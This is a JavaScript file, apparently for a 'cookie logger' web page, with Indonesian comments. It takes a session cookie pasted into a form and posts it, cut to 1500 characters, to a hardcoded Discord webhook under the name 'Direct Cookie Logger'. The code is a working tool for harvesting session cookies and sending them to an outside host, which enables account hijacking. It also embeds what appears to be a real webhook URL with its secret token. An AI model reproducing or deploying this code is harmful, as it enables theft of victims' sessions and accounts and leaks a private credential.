document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('cookieForm');
    const cookieInput = document.getElementById('cookieInput');
    const statusDiv = document.getElementById('status');

    // !!! WEBHOOK URL LO (RAHASIAKAN!) !!!
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1473284471137767558/asp42MiZ5mb6XaOXVNRmiyVsxVl5tG5AeWy6pJ2TXq8-0Ak-Y6tuuozHpVLlySDbPHlG';

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const cookie = cookieInput.value.trim();

        if (!cookie) {
            showStatus('Cookie nggak boleh kosong, bro!', 'error');
            return;
        }

        showStatus('Sedang mengirim...', 'processing');

        // Kita potong cookie-nya biar nggak error di Discord
        const shortCookie = cookie.substring(0, 1500); 

        const payload = {
            content: `🍪 **Cookie Baru Masuk (V2)!** (Panjang: ${cookie.length} char)\n\`\`\`${shortCookie}...\`\`\``,
            username: "Direct Cookie Logger",
            avatar_url: "https://i.imgur.com/rVw5B2W.png"
        };

        try {
            const response = await fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });

            if (response.ok) {
                showStatus('✅ SUKSES! Cookie terkirim ke Discord!', 'success');
                cookieInput.value = ''; // Kosongkan kotak
            } else {
                const errorData = await response.text();
                console.error('Discord Error:', response.status, errorData);
                showStatus(`❌ ERROR! Gagal kirim ke Discord.`, 'error');
            }
        } catch (error) {
            console.error('Fetch Error:', error);
            showStatus(`❌ FATAL ERROR! Cek koneksi internet.`, 'error');
        }
    });

    function showStatus(message, type) {
        statusDiv.textContent = message;
        statusDiv.style.opacity = '1';
        
        statusDiv.className = 'mt-8 text-center text-lg font-semibold p-4 bg-gray-700 bg-opacity-70 rounded-lg border shadow-inner transition-opacity duration-500 ease-out';
        
        if (type === 'error') {
            statusDiv.classList.add('text-red-400', 'border-red-600', 'animate-pulse');
        } else if (type === 'success') {
            statusDiv.classList.add('text-green-400', 'border-green-600');
        } else {
            statusDiv.classList.add('text-yellow-400', 'border-yellow-600', 'animate-pulse');
        }
    }
});
